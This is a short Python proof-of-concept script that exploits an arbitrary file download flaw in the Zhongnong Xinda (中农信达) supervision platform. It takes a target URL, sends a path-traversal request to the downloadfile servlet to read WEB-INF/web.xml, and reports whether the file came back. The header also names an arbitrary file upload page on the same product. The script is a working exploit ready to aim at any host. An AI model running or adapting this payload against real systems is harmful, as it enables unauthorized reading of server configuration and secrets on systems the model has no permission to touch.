#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 中农信达监察平台任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2014-069864
author: Lucifer
description: servlet/downloadfile?filename= 文件下载。/hzs/HTMLEditor/upload_img.jsp 任意文件上传。
'''
import sys
import requests
import warnings
def run(url):
        result = ['中农信达监察平台任意文件下载','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/finance/servlet/downloadfile?filename=/../WEB-INF/web.xml&userid=/"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<web-app>" in req.text and r"<servlet-name>" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
